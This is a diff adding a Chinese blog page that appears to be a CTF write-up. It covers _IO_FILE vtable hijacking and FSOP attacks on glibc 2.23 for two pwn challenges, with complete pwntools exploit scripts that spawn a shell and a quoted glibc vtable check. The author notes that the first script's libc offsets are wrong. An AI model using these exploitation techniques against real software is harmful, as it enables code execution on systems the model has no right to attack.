@@ -1,0 +1,195 @@
+<!DOCTYPE html><html lang="Chinese" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>关于_IO_FILE的一些攻击手法 | MoYingXing</title><meta name="author" content="陌影形"><meta name="copyright" content="陌影形"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HCTF 2018the_end版本glibc2.23 思路1.虚表劫持 2.虚表函数指针修改（改为one_gadget） 需要选对glibc，否则onegaget打不通…..下面py的libc是错的，但是调试的时候可以观察到会执行onegadget 3.exec &#x2F;bin&#x2F;sh 1&gt;&amp;0标准输出重定向 pyfrom pwn import *io &#x3D; process(&quot;.&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于_IO_FILE的一些攻击手法">
+<meta property="og:url" content="http://example.com/2024/08/13/userpwn/%E5%85%B3%E4%BA%8E-IO-FILE%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/index.html">
+<meta property="og:site_name" content="MoYingXing">
+<meta property="og:description" content="HCTF 2018the_end版本glibc2.23 思路1.虚表劫持 2.虚表函数指针修改（改为one_gadget） 需要选对glibc，否则onegaget打不通…..下面py的libc是错的，但是调试的时候可以观察到会执行onegadget 3.exec &#x2F;bin&#x2F;sh 1&gt;&amp;0标准输出重定向 pyfrom pwn import *io &#x3D; process(&quot;.&#x2F;">
+<meta property="og:locale">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/162703063?s=400&u=7f599e5661244ad7e8490354a9580880dc56acde&v=4">
+<meta property="article:published_time" content="2024-08-13T09:45:08.000Z">
+<meta property="article:modified_time" content="2024-09-23T04:30:08.000Z">
+<meta property="article:author" content="陌影形">
+<meta property="article:tag" content="userpwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://avatars.githubusercontent.com/u/162703063?s=400&u=7f599e5661244ad7e8490354a9580880dc56acde&v=4"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/08/13/userpwn/%E5%85%B3%E4%BA%8E-IO-FILE%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '关于_IO_FILE的一些攻击手法',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-09-23 12:30:08'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://avatars.githubusercontent.com/u/162703063?s=400&amp;u=7f599e5661244ad7e8490354a9580880dc56acde&amp;v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">53</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">17</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/cov.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MoYingXing"><img class="site-icon" src="/img/favicon.png"/><span class="site-name">MoYingXing</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">关于_IO_FILE的一些攻击手法</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-08-13T09:45:08.000Z" title="Created 2024-08-13 17:45:08">2024-08-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-09-23T04:30:08.000Z" title="Updated 2024-09-23 12:30:08">2024-09-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/userpwn/">userpwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="关于_IO_FILE的一些攻击手法"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="HCTF-2018the-end"><a href="#HCTF-2018the-end" class="headerlink" title="HCTF 2018the_end"></a>HCTF 2018the_end</h1><h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>glibc2.23</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>1.虚表劫持</p>
+<p>2.虚表函数指针修改（改为one_gadget）</p>
+<p>需要选对glibc，否则onegaget打不通…..下面py的libc是错的，但是调试的时候可以观察到会执行onegadget</p>
+<p>3.<code>exec /bin/sh 1&gt;&amp;0</code>标准输出重定向</p>
+<h2 id="py"><a href="#py" class="headerlink" title="py"></a>py</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(<span class="string">&quot;./the_end&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">io.recvuntil(b<span class="number">&#x27;0</span>x<span class="number">&#x27;</span>)</span><br><span class="line">add = <span class="type">int</span>(io.recvuntil(b<span class="string">&quot;,&quot;</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">io.recv()</span><br><span class="line">oldvatable =add+<span class="number">3108576</span></span><br><span class="line">vtableadd0 =<span class="number">3116784</span>+<span class="number">8</span>+add</span><br><span class="line">vtable =  oldvatable + <span class="number">2272</span></span><br><span class="line">gadget1=add<span class="number">-550310</span></span><br><span class="line">gadget2=add+<span class="number">147956</span></span><br><span class="line">gadget3=add+<span class="number">151703</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">2</span>):</span><br><span class="line">    io.send(p64(vtableadd0+i))</span><br><span class="line">    io.send(p64(vtable)[i:i+<span class="number">1</span>])</span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">3</span>):</span><br><span class="line">    io.send(p64(vtable+<span class="number">0x58</span>+i))</span><br><span class="line">    io.send(p64(gadget2)[i:i+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+<h2 id="关于本题利用方法的一些复盘"><a href="#关于本题利用方法的一些复盘" class="headerlink" title="关于本题利用方法的一些复盘"></a>关于本题利用方法的一些复盘</h2><p>目前io利用方面处于小白的阶段，主要是因为io的实现过于复杂，一堆宏定义反复横跳，并且一些用户函数在处理完很多东西都会跳到io，但是那些用户函数的实现却不仅仅涉及io，因此想要完全分析明白几乎不可能。本题就是在考察exit的执行流，经过无数层函数调用，也会处理到IO。可以在下图的函数调用栈看出：</p>
+<p><img src="/img/mypic/io/vtablecheck.png" alt="vtablecheck.png"></p>
+<p>此函数会遍历<code>_IO_list_all</code>链表之后调用虚表中的<code>_setbuf</code>函数 ，因此只要覆盖虚表中的函数指针，即可执行想要的函数。但是关于file虚表劫持这件事在libc2.23以后已经成为了过去式，其会判断虚表指针是否在指定范围之内。可看如下代码，并且虚表所处的位置是可读数据段也就是说不可修改，因此此方法基本行不通了，但是有很大的学习意义。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="ciscn-2019-n-7"><a href="#ciscn-2019-n-7" class="headerlink" title="ciscn_2019_n_7"></a>ciscn_2019_n_7</h1><h2 id="版本-1"><a href="#版本-1" class="headerlink" title="版本"></a>版本</h2><p>glibc2.23</p>
+<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>1.利用FSOP，通过更改_IO_list_all结构体，来改变进行文件流操作时的函数调用。</p>
+<p>2.伪造_IO_FILE_plus使其一些成员满足一些特定条件来调用假的虚表中的函数。</p>
+<h2 id="py-1"><a href="#py-1" class="headerlink" title="py"></a>py</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29483</span>)</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>,b<span class="number">&#x27;666&#x27;</span>)</span><br><span class="line"><span class="built_in">puts</span> = <span class="type">int</span>(io.recvuntil(<span class="string">&quot;\n&quot;</span>).strip(),<span class="number">16</span>)</span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;puts&quot;</span>, <span class="built_in">puts</span>)</span><br><span class="line">base = <span class="built_in">puts</span> - obj.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">print(hex(base))</span><br><span class="line">print(hex(<span class="built_in">puts</span>))</span><br><span class="line">def add(size,name):</span><br><span class="line">    io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>, b<span class="number">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Input string Length: \n&quot;</span>,size)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Author name:\n&quot;</span>,name)</span><br><span class="line">def edit(name,con):</span><br><span class="line">    io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>, b<span class="number">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;New Author name:\n&quot;</span>,name)</span><br><span class="line">    io.sendafter(<span class="string">&quot;New contents:\n&quot;</span>,con)</span><br><span class="line">def <span class="built_in">exit</span>():</span><br><span class="line">    io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>, b<span class="number">&#x27;4&#x27;</span>)</span><br><span class="line">_IO_2_1_stderr_=base+<span class="number">0x3c4540</span></span><br><span class="line">vtableadd =_IO_2_1_stderr_+<span class="number">216</span></span><br><span class="line">bss = base+<span class="number">0x3c3000</span>+<span class="number">0x2000</span></span><br><span class="line">bssbuf = base+<span class="number">0x3c3000</span>+<span class="number">0x2200</span></span><br><span class="line">sys = base + obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">add(b<span class="number">&#x27;152&#x27;</span>,<span class="number">8</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">edit(<span class="number">8</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>+p64(vtableadd),p64(bss))</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">edit(b<span class="number">&#x27;</span>aaaaaaaa<span class="number">&#x27;</span>+p64(bss),<span class="number">12</span>*p64(sys))</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">payload = b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span>+<span class="number">4</span>*p64(<span class="number">0x0</span>)+p64(<span class="number">0x1</span>)+p64(<span class="number">0x2</span>)+<span class="number">2</span>*p64(<span class="number">0x0</span>)</span><br><span class="line">edit(b<span class="number">&#x27;</span>aaaaaaaa<span class="number">&#x27;</span>+p64(_IO_2_1_stderr_),payload)</span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;1.add page\n2.edit page\n3.show page\n4.exit\nYour choice-&gt; \n&quot;</span>, b<span class="number">&#x27;</span>hh<span class="number">&#x27;</span>)</span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="疑难"><a href="#疑难" class="headerlink" title="疑难"></a>疑难</h2><p>本题有诸多待解决的问题，利用exit（）无法打通，感觉是因为在exit选项的时候标准输入和标准输出已关闭，但是感觉也可以通过重定向到stderr来解决，需要对文件流的函数执行流程有足够的理解才能完成此构造，未来有机会解决此问题。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">陌影形</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/08/13/userpwn/%E5%85%B3%E4%BA%8E-IO-FILE%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/">http://example.com/2024/08/13/userpwn/%E5%85%B3%E4%BA%8E-IO-FILE%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/userpwn/">userpwn</a></div><div class="post_share"><div class="social-share" data-image="https://avatars.githubusercontent.com/u/162703063?s=400&amp;u=7f599e5661244ad7e8490354a9580880dc56acde&amp;v=4" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/14/userpwn/IO-FILE%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/" title="IO_FILE函数分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">IO_FILE函数分析</div></div></a></div><div class="next-post pull-right"><a href="/2024/08/13/userpwn/fmtstr/" title="fmtstr一些源码学习"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">fmtstr一些源码学习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2024/08/19/userpwn/SmallbinAttach/" title="POC for SmallbinAttach"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-19</div><div class="title">POC for SmallbinAttach</div></div></a></div><div><a href="/2024/08/14/userpwn/IO-FILE%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/" title="IO_FILE函数分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-14</div><div class="title">IO_FILE函数分析</div></div></a></div><div><a href="/2024/08/19/userpwn/LargerbinAttach/" title="POC for LagerbinAttach"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-19</div><div class="title">POC for LagerbinAttach</div></div></a></div><div><a href="/2024/08/13/userpwn/fmtstr/" title="fmtstr一些源码学习"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-13</div><div class="title">fmtstr一些源码学习</div></div></a></div><div><a href="/2024/08/23/userpwn/applepoc/" title="house of apple"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-23</div><div class="title">house of apple</div></div></a></div><div><a href="/2024/09/15/userpwn/all/" title="pwn模板整理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-15</div><div class="title">pwn模板整理</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div id="lv-container" data-id="city" data-uid="MTAyMC82MDAzNi8zNjQ5OQ=="></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://avatars.githubusercontent.com/u/162703063?s=400&amp;u=7f599e5661244ad7e8490354a9580880dc56acde&amp;v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">陌影形</div><div class="author-info__description">MYX</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">53</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">17</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/MoyInGxing"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/MoyInGxing" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HCTF-2018the-end"><span class="toc-number">1.</span> <span class="toc-text">HCTF 2018the_end</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%88%E6%9C%AC"><span class="toc-number">1.1.</span> <span class="toc-text">版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#py"><span class="toc-number">1.3.</span> <span class="toc-text">py</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E6%9C%AC%E9%A2%98%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A4%8D%E7%9B%98"><span class="toc-number">1.4.</span> <span class="toc-text">关于本题利用方法的一些复盘</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019-n-7"><span class="toc-number">2.</span> <span class="toc-text">ciscn_2019_n_7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%88%E6%9C%AC-1"><span class="toc-number">2.1.</span> <span class="toc-text">版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">2.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#py-1"><span class="toc-number">2.3.</span> <span class="toc-text">py</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%96%91%E9%9A%BE"><span class="toc-number">2.4.</span> <span class="toc-text">疑难</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/22/C++/%E7%B1%BB/" title="C++类机制">C++类机制</a><time datetime="2024-09-22T09:45:08.000Z" title="Created 2024-09-22 17:45:08">2024-09-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/20/linux%E5%86%85%E6%A0%B8/linux5.15%E5%88%86%E6%9E%90/%E5%85%B3%E4%BA%8Epage%E5%88%86%E9%85%8D/" title="linux5.15之page分配">linux5.15之page分配</a><time datetime="2024-09-20T09:45:08.000Z" title="Created 2024-09-20 17:45:08">2024-09-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/19/%E5%AF%86%E7%A0%81%E5%AD%A6/%E4%BF%A1%E6%81%AF%E8%AE%BA/" title="Untitled">Untitled</a><time datetime="2024-09-19T00:40:05.460Z" title="Created 2024-09-19 08:40:05">2024-09-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/17/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AE%9E%E6%88%98/" title="密码学实战">密码学实战</a><time datetime="2024-09-17T09:45:08.000Z" title="Created 2024-09-17 17:45:08">2024-09-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/16/linux%E5%86%85%E6%A0%B8/linux5.15%E5%88%86%E6%9E%90/%E5%85%B3%E4%BA%8Epage/" title="linux5.15之page">linux5.15之page</a><time datetime="2024-09-16T09:45:08.000Z" title="Created 2024-09-16 17:45:08">2024-09-16</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/footer.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2024 By 陌影形</div><div class="footer_custom_text">END</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog 